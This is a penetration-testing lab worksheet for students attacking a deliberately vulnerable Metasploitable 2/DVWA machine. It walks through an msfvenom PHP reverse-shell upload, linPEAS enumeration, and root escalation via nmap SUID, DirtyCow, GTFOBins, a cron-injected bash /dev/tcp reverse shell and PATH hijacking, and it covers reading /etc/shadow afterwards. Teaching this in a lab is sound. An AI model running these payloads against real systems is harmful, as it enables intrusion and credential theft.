# 🧪 Linux Privilege Escalation Worksheet (Using linPEAS)

## First Steps
1. Please review the [student_privesc_template.md](https://github.com/anombyte93/student_privesc/blob/main/student_privesc_template.md) and follow the detailed instructions on how to fork the document so you can make changes to it!
2. Follow the template, I would recommend making changes ONLINE but I have included instructions on how to change on your own PC or in Kali as well if you would prefer.

## 🎯 Objective

Guide students through gaining an initial foothold via a file upload vulnerability, and then escalating privileges on a Linux system using `linPEAS`. The goal is to identify misconfigurations or vulnerabilities that could lead to root access.

## Note

Whenever I mention an IP address in a command, use YOUR ip address for that machine e.g. 

- If I mention the 192.168.174.130 that is YOUR KALI IP. 
- If I mention the 192.168.174.128 that is YOUR METASPLOIT2 IP.

---

## 🛠️ Part 1: Exploiting File Upload Vulnerability (Foothold)

### 🔹 Step-by-Step Foothold Walkthrough

1. **Identify IP Addresses on Kali and Metasploitable using the below command on both machines.**

   ```bash
   ifconfig
   ```

   In my case the IP's of each are:

   - Kali IP: `192.168.174.130`
   - Metasploitable IP: `192.168.174.128`

2. **Ping the Target**:

   ```bash
   ping 192.168.174.128
   ```

   Confirm the two machines can reach each other.

3. **Access DVWA on Metasploitable**: Open Firefox and navigate to:

   ```
   http://192.168.174.128/dvwa/login.php
   ```

   - Username: `admin`
   - Password: `password`

4. **Set DVWA Security Level to Low**:

   - Go to the “DVWA Security” tab
   - Set security level to **Low** and submit

5. **Navigate to File Upload Tab**

   - Click on “Upload” in the DVWA sidebar

6. **Generate a PHP Reverse Shell**: Use msfvenom to generate the payload:

   ```bash
   msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.174.130 LPORT=4444 -f raw -o shell.php
   ```

7. **Upload the Reverse Shell**:

   - Upload `shell.php` to the DVWA Upload page
   - Confirm the message: `../../hackable/uploads/shell.php successfully uploaded!`

8. **Navigate to the Uploaded Shell**: Visit:

   ```
   http://192.168.174.128/dvwa/hackable/uploads/shell.php
   ```

   If it returns `*/` or is blank, the PHP code is being processed.

9. **Set Up the Listener on Kali**:

   ```bash
   msfconsole
   use exploit/multi/handler
   set payload php/meterpreter_reverse_tcp
   set LHOST 192.168.174.130
   set LPORT 4444
   run
   ```

10. **Trigger the Shell**:

    - Reload the shell.php page (`http://192.168.174.128/dvwa/hackable/uploads/shell.php`)
    - Meterpreter session should open:
      ```
      meterpreter >
      ```

11. **Congrats — You Have Foothold!** Now you can proceed with privilege escalation.

---

## 🔧 Part 2: Privilege Escalation with linPEAS

### 🔹 Setup linPEAS on the Target

1. Download `linpeas.sh` on Kali:

   ```bash
   wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
   chmod +x linpeas.sh
   ```

2. Upload to the target (via Meterpreter):

   ```bash
   upload linpeas.sh /tmp/linpeas.sh
   ```

3. Execute linPEAS:

   ```bash
   shell
   chmod +x /tmp/linpeas.sh
   /tmp/linpeas.sh | tee /tmp/linpeas.out
   ```

---

## 📋 Student Tasks

### 🔹 Task 1: Basic Enumeration and Understanding linPEAS Output

- linPEAS performs automated privilege escalation checks. It looks for:
  - SUID binaries
  - Cron jobs
  - Writable scripts
  - Kernel exploits
  - Exposed credentials or tokens

**What matters most? Prioritized checklist:**

1. **Root-owned SUID binaries** — can they be abused to run as root?
2. **Writable files executed by root** — cron scripts, services, etc.
3. **Cleartext credentials** — `.bash_history`, config files, backups
4. **Kernel version** — does linPEAS suggest a working exploit?
5. **World-writable folders or binaries** — especially in root's PATH

As a pentester, you'd always:

- Confirm current user with `whoami`
- Check kernel version with `uname -a`
- Identify attack surface from linPEAS output

You are not expected to exploit every finding — just understand what it means and what’s high-value.

### 🔹 Task 2: Exploit Path Hypothesis

In this lab, one common exploitable path in Metasploitable 2 is:

\*\*SUID binary \*\*``

- This version of Nmap allows interactive mode (`--interactive`), which can lead to root.

**Steps to abuse it:**

```bash
/usr/bin/nmap --interactive
!sh
```

This drops you into a root shell because the SUID bit executes Nmap as root.

**Why it works:**

- `nmap` is owned by root and has the SUID bit set
- It allows running system commands in interactive mode
- That gives the attacker a root shell

### 🔹 Task 3: Post-Exploitation: What to Do Once You're Root

Once you have root access, a real penetration tester would:

- **Confirm it**:

  ```bash
  whoami
  id
  ```

- **Collect sensitive data**:

  ```bash
  cat /etc/shadow
  ls -la /root
  cat /root/.bash_history
  find /home -type f
  ```

- **Search for credentials, tokens, or API keys**

- **Dump user info for potential lateral movement**

- **Take screenshots or save logs for reporting**

Your task is to demonstrate that you gained root and understand how to explore the system responsibly.

---

## 🌟 Bonus Tasks

### 🟢 Bonus Task 1: Try DirtyCow (Kernel Exploit)

**What is DirtyCow?** DirtyCow (CVE-2016-5195) is a kernel vulnerability that allows a regular user to write to read-only files. It's called Dirty *COW* because it's a bug in the Copy-On-Write system. It lets attackers modify `/etc/passwd` to add a new root user.

This works on old kernels — Metasploitable 2 has one!

#### ✅ Step-by-Step Guide:

1. On your **Kali machine**, download a DirtyCow exploit from GitHub:

```bash
curl -O https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
```

2. Compile the exploit:

```bash
gcc dirty.c -o dirty -pthread -lcrypt
```

3. **Upload the exploit to the target’s **``** directory**:

```bash
meterpreter > upload dirty /tmp/dirty
```

**Why **``**?**

- `/tmp` is world-writable — any user can write there
- You usually don’t need special permissions to execute from `/tmp`

4. On the target:

```bash
shell
cd /tmp
chmod +x dirty
./dirty
```

5. After it runs, it should create a new user `firefart` with UID 0 (root). You can now switch users:

```bash
su firefart
```

Password will be shown in the exploit output — usually `dirtyCowFun` or similar.

---

### 🟢 Bonus Task 2: Try GTFOBins (SUID Binary Exploits)

**What is GTFOBins?** GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions. If a binary is SUID (set-user-ID), and it's on the list, it might let you escalate privileges — even to root.

You can find it here: [https://gtfobins.github.io](https://gtfobins.github.io)

#### ✅ Step-by-Step Guide:

1. Search for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

2. Look for something like `find`, `less`, `vim`, `nmap`, `bash`, `cp`, etc.

3. Check GTFOBins for that binary. For example:

- Visit [https://gtfobins.github.io/gtfobins/find/](https://gtfobins.github.io/gtfobins/find/)
- Scroll down to the "SUID" section
- It gives you an exact command to try, like:

```bash
find . -exec /bin/sh \; -quit
```

4. If the binary is SUID (owned by root), and you can execute that command, it might drop you into a root shell!

---

## ❓ Mystery Task: Find Another Privilege Escalation Path from linPEAS Output

This is a more challenging task — use what linPEAS tells you to find *another* way to get root access. You're getting 4/5 fingers of help here 😉

### 🔍 Option 1: Writable Cron Scripts (aka Scheduled Jobs)

**What is cron?** Cron is a system that runs scheduled commands. If root is running a script every minute/hour/day — and you can *edit* that script — you can inject your own code.

#### ✅ Step-by-Step:

1. Check linPEAS output for `cron` jobs or scheduled tasks.
2. Or manually check the folders:

```bash
ls -l /etc/cron.d
ls -l /etc/cron.daily
ls -l /etc/cron.hourly
cat /etc/crontab
```

3. Look for scripts that:

- Run as root
- Are writable by your user

4. Inject a payload into one:

```bash
echo '/bin/bash -c "bash -i >& /dev/tcp/YOUR_KALI_IP/1234 0>&1"' >> /etc/cron.daily/backup.sh
```

5. Start a listener on Kali:

```bash
nc -lvnp 1234
```

Wait for the job to trigger — you may get a root shell back!

### 🔍 Option 2: PATH Hijacking

**What is PATH hijacking?** Sometimes scripts run like this:

```bash
run-backup
```

If `run-backup` isn’t a full path (like `/usr/bin/run-backup`), the system searches `$PATH` for it. If you can put a malicious `run-backup` file *earlier* in the path and make it executable — it gets run instead!

#### ✅ Step-by-Step:

1. linPEAS shows services, cron jobs, or scripts being run without full paths
2. Find the folder it’s searching — maybe `/usr/local/bin` or `/tmp`
3. Make a fake binary:

```bash
echo "#!/bin/bash" > /tmp/run-backup
echo "bash" >> /tmp/run-backup
chmod +x /tmp/run-backup
```

4. Add `/tmp` to the front of `$PATH`:

```bash
export PATH=/tmp:$PATH
```

5. Trigger the script or cron job — if successful, you may get a root shell!

📌 **Your task**: Pick either method (cron or PATH hijack), use the clues from linPEAS, and explain:

- What file or config is exploitable?
- Why is it dangerous?
- What did you inject or modify?

---

## 💡 Reflection Questions

- Why is understanding *why* an escalation works important?
- How would you explain SUID risks to a developer?
- What should your next step be after getting root?

---

## ✅ Submission Instructions

- Create a document which will act as your portfolio walkthrough for this pentest in word or any text editing tool.
  - Include what you performed at each step and why
  - The output of the linPEAS findings
  - One step by step Privesc path and root confirmation
  - Step by step attempts at 1 Bonus or Mystery task
- Submit a 1-paragraph reflection on the escalation path used and what you understand!



